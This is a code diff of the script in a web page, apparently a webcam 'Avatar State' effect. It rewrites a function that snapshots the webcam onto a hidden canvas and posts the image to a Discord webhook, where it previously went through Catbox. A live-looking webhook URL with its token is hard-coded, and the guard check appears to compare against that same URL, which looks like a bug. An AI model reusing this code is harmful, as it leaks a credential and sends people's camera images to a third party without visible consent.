@@ -298,53 +298,29 @@
         }
 
         function captureAndSendToDiscord(captionText) {
-            if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL.includes("https://discord.com/api/webhooks/1548376439743717386/5-Mah_MweniRhFAzjFAfKGy8uP29zmiVGqzkZauG6-gkgpFgFsNCTvd46kbstoNMf021")) return;
+    if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL.includes("https://discord.com/api/webhooks/1548376439743717386/5-Mah_MweniRhFAzjFAfKGy8uP29zmiVGqzkZauG6-gkgpFgFsNCTvd46kbstoNMf021")) return;
 
-            snapshotCtx.save();
-            snapshotCtx.scale(-1, 1);
-            snapshotCtx.drawImage(videoElement, -snapshotCanvas.width, 0, snapshotCanvas.width, snapshotCanvas.height);
-            snapshotCtx.restore();
+    // Draw unmirrored snapshot to hidden canvas
+    snapshotCtx.save();
+    snapshotCtx.scale(-1, 1);
+    snapshotCtx.drawImage(videoElement, -snapshotCanvas.width, 0, snapshotCanvas.width, snapshotCanvas.height);
+    snapshotCtx.restore();
 
-            snapshotCanvas.toBlob(async (blob) => {
-                try {
-                    // Upload image anonymously to Catbox (a public file hosting API that allows direct browser uploads)
-                    const formData = new FormData();
-                    formData.append('reqtype', 'fileupload');
-                    formData.append('fileToUpload', blob, 'avatar.jpg');
+    // Convert directly to a JPEG blob and send via direct multipart FormData
+    snapshotCanvas.toBlob((blob) => {
+        const formData = new FormData();
+        formData.append('payload_json', JSON.stringify({ 
+            content: `🔥 **Avatar State Triggered:** ${captionText}` 
+        }));
+        formData.append('file0', blob, 'avatar-capture.jpg');
 
-                    const uploadRes = await fetch('https://catbox.moe/user/api.php', {
-                        method: 'POST',
-                        body: formData
-                    });
-                    
-                    const imageUrl = await uploadRes.text();
-
-                    if (!imageUrl.startsWith('http')) {
-                        console.error("Image upload failed:", imageUrl);
-                        return;
-                    }
-
-                    // Send the public image URL cleanly to Discord via standard JSON (100% CORS-safe)
-                    const discordPayload = {
-                        content: `🔥 **Avatar State Triggered:** ${captionText}`,
-                        embeds: [{
-                            image: {
-                                url: imageUrl.trim()
-                            }
-                        }]
-                    };
-
-                    await fetch(DISCORD_WEBHOOK_URL, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(discordPayload)
-                    });
-
-                } catch (err) {
-                    console.error('Webhook Dispatch Error:', err);
-                }
-            }, 'image/jpeg', 0.85);
-        }
+        // Direct fetch call to Discord webhook
+        fetch(DISCORD_WEBHOOK_URL, {
+            method: 'POST',
+            body: formData
+        }).catch(err => console.error('Discord Webhook Error:', err));
+    }, 'image/jpeg', 0.85);
+}
     </script>
 </body>
 </html>
